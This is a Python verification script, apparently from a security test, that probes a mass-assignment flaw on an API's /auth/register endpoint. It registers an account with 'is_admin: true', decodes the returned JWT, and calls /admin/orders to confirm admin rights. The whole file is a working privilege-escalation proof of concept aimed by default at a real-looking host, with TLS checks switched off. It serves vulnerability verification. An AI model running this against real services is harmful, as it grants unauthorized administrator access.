     1	#!/usr/bin/env python3
     2	"""Verify: Mass-assignment of `is_admin` on POST /auth/register.
     3	
     4	Registers a fresh user with `is_admin: true` in the JSON body and checks
     5	whether the resulting account and JWT are granted administrator privileges.
     6	
     7	Exit code 0 = still vulnerable. Exit code 1 = not vulnerable / fixed / error.
     8	
     9	Optional environment variables:
    10	    TARGET_URL   Base URL (default: https://api.taintedport.com)
    11	
    12	Usage:
    13	    python3 verify.py
    14	"""
    15	import os, sys, json, time, base64, requests, urllib3
    16	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    17	
    18	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    19	
    20	
    21	def _b64pad(s: str) -> bytes:
    22	    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    23	
    24	
    25	def check() -> int:
    26	    email = f"verify-massassign-{int(time.time()*1000)}@example.com"
    27	    body = {
    28	        "name": "Verify MA",
    29	        "email": email,
    30	        "password": "VerifyP@ss123",
    31	        "is_admin": True,
    32	    }
    33	    try:
    34	        r = requests.post(f"{TARGET_URL}/auth/register", json=body, timeout=15, verify=False)
    35	    except Exception as e:
    36	        print(f"[NOT VULNERABLE] request failed: {e}")
    37	        return 1
    38	
    39	    if r.status_code != 201:
    40	        print(f"[NOT VULNERABLE] register returned HTTP {r.status_code}: {r.text[:200]}")
    41	        return 1
    42	
    43	    reg = r.json()
    44	    user = reg.get("user", {})
    45	    token = reg.get("token", "")
    46	
    47	    user_is_admin = user.get("is_admin") is True
    48	
    49	    jwt_is_admin = False
    50	    if token.count(".") >= 2:
    51	        try:
    52	            payload = json.loads(_b64pad(token.split(".")[1]))
    53	            jwt_is_admin = payload.get("is_admin") is True
    54	        except Exception:
    55	            pass
    56	
    57	    admin_access = False
    58	    if token:
    59	        try:
    60	            r2 = requests.get(f"{TARGET_URL}/admin/orders",
    61	                              headers={"Authorization": f"Bearer {token}"},
    62	                              timeout=15, verify=False)
    63	            admin_access = (r2.status_code == 200)
    64	        except Exception:
    65	            pass
    66	
    67	    if user_is_admin and jwt_is_admin and admin_access:
    68	        print(f"[VULNERABLE] mass-assigned is_admin=true persisted; "
    69	              f"JWT carries is_admin=true; /admin/orders → 200")
    70	        return 0
    71	
    72	    print(f"[NOT VULNERABLE] user.is_admin={user.get('is_admin')} "
    73	          f"jwt.is_admin={jwt_is_admin} admin_access={admin_access}")
    74	    return 1
    75	
    76	
    77	if __name__ == "__main__":
    78	    sys.exit(check())